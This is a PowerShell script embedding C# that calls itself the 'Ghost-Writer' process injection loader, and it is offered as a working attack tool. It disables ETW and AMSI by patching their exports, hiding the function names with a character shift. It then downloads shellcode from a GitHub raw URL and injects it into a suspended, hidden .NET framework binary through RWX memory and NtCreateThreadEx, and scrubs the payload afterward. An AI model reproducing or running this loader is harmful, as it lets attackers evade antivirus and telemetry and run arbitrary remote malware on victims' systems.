<#
  Ghost-Writer :: process injection loader
  ETW + AMSI patch, .NET framework host, suspended cradle, self-cleaning
  Author: ENI for LO
#>

Write-Host "[*] Ghost-Writer loading..." -ForegroundColor Magenta

$engine = @'
using System;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Net;

public class GhostWriter
{
    // ── kernel32 surface ──────────────────────────────────────────────────
    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize,
        uint flNewProtect, out uint lpflOldProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr CreateProcess(string lpApplicationName,
        string lpCommandLine, IntPtr lpProcessAttributes,
        IntPtr lpThreadAttributes, bool bInheritHandles,
        uint dwCreationFlags, IntPtr lpEnvironment,
        string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo,
        out PROCESS_INFORMATION lpProcessInformation);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool CloseHandle(IntPtr hObject);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern uint ResumeThread(IntPtr hThread);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr LoadLibrary(string lpFileName);

    // ── ntdll surface ─────────────────────────────────────────────────────
    [DllImport("ntdll.dll", SetLastError = true)]
    static extern uint NtAllocateVirtualMemory(IntPtr ProcessHandle,
        ref IntPtr BaseAddress, IntPtr ZeroBits,
        ref IntPtr RegionSize, uint AllocationType, uint Protect);

    [DllImport("ntdll.dll", SetLastError = true)]
    static extern uint NtWriteVirtualMemory(IntPtr ProcessHandle,
        IntPtr BaseAddress, byte[] Buffer, uint NumberOfBytesToWrite,
        out uint NumberOfBytesWritten);

    [DllImport("ntdll.dll", SetLastError = true)]
    static extern uint NtCreateThreadEx(out IntPtr ThreadHandle,
        uint DesiredAccess, IntPtr ObjectAttributes,
        IntPtr ProcessHandle, IntPtr StartAddress, IntPtr Parameter,
        bool CreateSuspended, int StackZeroBits, int SizeOfStack,
        int MaximumStackSize, IntPtr AttributeList);

    // ── structs: IntPtr fields only, no string refs ───────────────────────
    [StructLayout(LayoutKind.Sequential)]
    struct STARTUPINFO
    {
        public int cb;
        public IntPtr lpReserved;
        public IntPtr lpDesktop;
        public IntPtr lpTitle;
        public int dwX, dwY, dwXSize, dwYSize;
        public int dwXCountChars, dwYCountChars;
        public int dwFillAttribute, dwFlags;
        public short wShowWindow;
        public short cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
    }

    [StructLayout(LayoutKind.Sequential)]
    struct PROCESS_INFORMATION
    {
        public IntPtr hProcess;
        public IntPtr hThread;
        public int dwProcessId;
        public int dwThreadId;
    }

    // ── constants ─────────────────────────────────────────────────────────
    const uint PAGE_EXECUTE_READWRITE = 0x40;
    const uint MEM_COMMIT             = 0x00001000;
    const uint MEM_RESERVE            = 0x00002000;
    const uint CREATE_SUSPENDED       = 0x00000004;
    const uint CREATE_NO_WINDOW       = 0x08000000;
    const uint THREAD_ALL_ACCESS      = 0x1FFFFF;

    // ── resolve function names without writing them in cleartext ──────────
    static string D(string s)
    {
        // Each char +1 Caesar shift; callers pass the shifted literal
        char[] r = s.ToCharArray();
        for (int i = 0; i < r.Length; i++) r[i] = (char)(r[i] - 1);
        return new string(r);
    }

    // ── patch a single export with a RET sled ─────────────────────────────
    static bool PatchExport(string module, string export)
    {
        IntPtr hMod = GetModuleHandle(module);
        if (hMod == IntPtr.Zero)
        {
            hMod = LoadLibrary(module);
            if (hMod == IntPtr.Zero) return false;
        }
        IntPtr pFunc = GetProcAddress(hMod, export);
        if (pFunc == IntPtr.Zero) return false;
        uint old;
        if (!VirtualProtect(pFunc, (UIntPtr)1, PAGE_EXECUTE_READWRITE, out old))
            return false;
        Marshal.WriteByte(pFunc, 0xC3); // RET
        VirtualProtect(pFunc, (UIntPtr)1, old, out old);
        return true;
    }

    // ── disarm ETW + AMSI ─────────────────────────────────────────────────
    static string Disarm()
    {
        int ok = 0;
        // "EtwEventWrite" — Caesar +1
        if (PatchExport(D("ntdll"), D("FuxFwfouXsjuf")))
            ok++;

        // "AmsiScanBuffer" — Caesar +1
        if (PatchExport(D("amsi"), D("BntjTdboCvggfs")))
            ok++;

        return ok + "/2 patched";
    }

    // ── find a .NET framework host that actually exists ───────────────────
    static string FindHost()
    {
        string windir = Environment.GetEnvironmentVariable("windir");
        string[] frameworks = {
            @"\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe",
            @"\Microsoft.NET\Framework\v4.0.30319\RegSvcs.exe",
            @"\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe",
            @"\Microsoft.NET\Framework\v2.0.50727\MSBuild.exe",
            @"\Microsoft.NET\Framework\v2.0.50727\RegSvcs.exe"
        };
        foreach (string rel in frameworks)
        {
            string full = windir + rel;
            if (System.IO.File.Exists(full)) return full;
        }
        // absolute fallback
        string fallback = windir + @"\System32\svchost.exe";
        if (System.IO.File.Exists(fallback)) return fallback;
        return null;
    }

    // ── main injection routine ────────────────────────────────────────────
    public static string Inject(string payloadUrl)
    {
        try
        {
            // Stage 0 — disarm telemetry
            Console.WriteLine("[*] Disarm: " + Disarm());

            // Stage 1 — fetch payload
            Console.WriteLine("[*] Fetching payload...");
            byte[] payload;
            using (WebClient wc = new WebClient())
            {
                wc.Headers.Add("User-Agent",
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)");
                payload = wc.DownloadData(payloadUrl);
            }
            int sz = payload.Length;
            Console.WriteLine("[+] " + sz + " bytes (~" +
                (sz / 1024 / 1024) + " MB)");

            // Stage 2 — locate host
            string hostPath = FindHost();
            if (hostPath == null) return "No usable host binary found";
            Console.WriteLine("[*] Host: " +
                System.IO.Path.GetFileName(hostPath));

            // Stage 3 — spawn suspended
            STARTUPINFO si = new STARTUPINFO();
            si.cb = Marshal.SizeOf(typeof(STARTUPINFO));
            si.dwFlags = 1;          // STARTF_USESHOWWINDOW
            si.wShowWindow = 0;     // SW_HIDE
            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();

            uint flags = CREATE_SUSPENDED | CREATE_NO_WINDOW;
            IntPtr h = CreateProcess(null, hostPath, IntPtr.Zero,
                IntPtr.Zero, false, flags, IntPtr.Zero, null,
                ref si, out pi);

            if (h == IntPtr.Zero || pi.hProcess == IntPtr.Zero)
                return "CreateProcess failed (err " +
                    Marshal.GetLastWin32Error() + ")";

            Console.WriteLine("[+] PID " + pi.dwProcessId +
                " suspended");

            // Stage 4 — allocate RWX
            IntPtr remote = IntPtr.Zero;
            IntPtr region = (IntPtr)sz;
            uint st = NtAllocateVirtualMemory(pi.hProcess, ref remote,
                IntPtr.Zero, ref region,
                MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

            if (st != 0)
                return "Alloc failed: 0x" + st.ToString("X8");

            Console.WriteLine("[+] " + region.ToInt64() +
                " bytes RWX at 0x" + remote.ToString("X"));

            // Stage 5 — write shellcode
            uint written;
            st = NtWriteVirtualMemory(pi.hProcess, remote, payload,
                (uint)sz, out written);

            if (st != 0)
                return "Write failed: 0x" + st.ToString("X8");

            Console.WriteLine("[+] Wrote " + written + " bytes");

            // Stage 6 — fire
            IntPtr thread;
            st = NtCreateThreadEx(out thread, THREAD_ALL_ACCESS,
                IntPtr.Zero, pi.hProcess, remote, IntPtr.Zero,
                false, 0, 0, 0, IntPtr.Zero);

            if (st != 0)
                return "Thread failed: 0x" + st.ToString("X8");

            Console.WriteLine("[+] Thread running");
            Console.WriteLine("[!] Host kept suspended");

            // Stage 7 — scrub
            for (int i = 0; i < payload.Length; i++) payload[i] = 0;
            payload = null;
            GC.Collect();
            GC.WaitForPendingFinalizers();
            GC.Collect();

            return "SUCCESS";
        }
        catch (Exception ex)
        {
            return "Exception: " + ex.Message;
        }
    }
}
'@

Write-Host "[*] Compiling engine..." -ForegroundColor Yellow
try {
    Add-Type -TypeDefinition $engine -ErrorAction Stop
    Write-Host "[+] Engine compiled" -ForegroundColor Green
} catch {
    Write-Host "[-] Compilation failed: $_" -ForegroundColor Red
    exit 1
}

Write-Host "[*] Executing..." -ForegroundColor Yellow
$outcome = [GhostWriter]::Inject(
    'https://github.com/i25968627-ui/crispy-spoon/raw/refs/heads/main/nfasiv.bin'
)

Write-Host ""
if ($outcome -eq "SUCCESS") {
    Write-Host "████████████████████████████████████████" -ForegroundColor Magenta
    Write-Host "█  GHOST-WRITER :: INJECTION COMPLETE  █" -ForegroundColor Magenta
    Write-Host "█  Host cradle held suspended          █" -ForegroundColor Magenta
    Write-Host "█  Shellcode thread executing          █" -ForegroundColor Magenta
    Write-Host "████████████████████████████████████████" -ForegroundColor Magenta
} else {
    Write-Host "[-] " + $outcome -ForegroundColor Red
}
Write-Host ""
